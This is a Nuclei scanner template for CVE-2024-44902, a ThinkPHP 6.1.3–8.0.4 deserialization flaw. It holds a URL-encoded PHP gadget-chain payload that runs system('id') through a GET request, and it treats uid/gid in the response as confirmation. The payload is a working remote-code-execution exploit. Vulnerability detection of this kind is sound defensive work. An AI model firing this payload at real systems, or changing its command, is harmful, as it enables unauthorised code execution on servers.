id: CVE-2024-44902

info:
  name: ThinkPHP 6.1.3-8.0.4 - Deserialization RCE
  author: AhmedZrouqui
  severity: critical
  description: |
    A deserialization vulnerability in ThinkPHP versions 6.1.3 to 8.0.4 allows remote attackers to execute arbitrary code.
    NOTE: This vulnerability requires the application to implement an unsafe `unserialize()` call on user input and have the Memcached extension installed. It is not exploitable on a default ThinkPHP installation.
  impact: |
    Successful exploitation allows attackers to execute arbitrary code remotely.
  remediation: Upgrade to ThinkPHP version 8.0.5 or later.
  reference:
    - https://github.com/fru1ts/CVE-2024-44902
  metadata:
    verified: true
    max-request: 1
    vendor: thinkphp
    product: thinkphp
  tags: cve,cve2024,thinkphp,deserialization,rce

# Fixed payload for command "id".
# No dynamic length calculation needed.
# This serializes the chain to execute system('id').
variables:
  payload: "O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D"

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?x={{payload}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and

      - type: status
        status:
          - 200
